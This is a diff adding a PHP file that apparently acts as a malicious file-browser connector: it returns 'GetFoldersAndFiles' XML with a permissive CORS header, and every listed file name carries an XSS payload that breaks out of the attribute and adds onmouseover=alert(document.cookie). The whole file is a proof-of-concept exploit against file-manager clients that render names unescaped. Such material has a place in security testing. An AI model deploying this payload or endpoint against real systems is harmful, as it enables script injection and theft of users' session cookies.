@@ -1,0 +1,21 @@
+<?php
+header('Access-Control-Allow-Origin: *');
+header("Content-Type: text/xml;");
+echo '<?xml version="1.0" encoding="utf-8" ?>';
+?>
+<Connector command="GetFoldersAndFiles" resourceType="File"><CurrentFolder path="/" url="/sad/das" />
+<Files>
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" icon="sad.png" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<File name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	<FILE name='AAAAAAAAAAAA"onmouseover=alert(document.cookie);>AAAAAAAAAAAAAAAAAimgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' size="1" />
+	</Files></Connector>
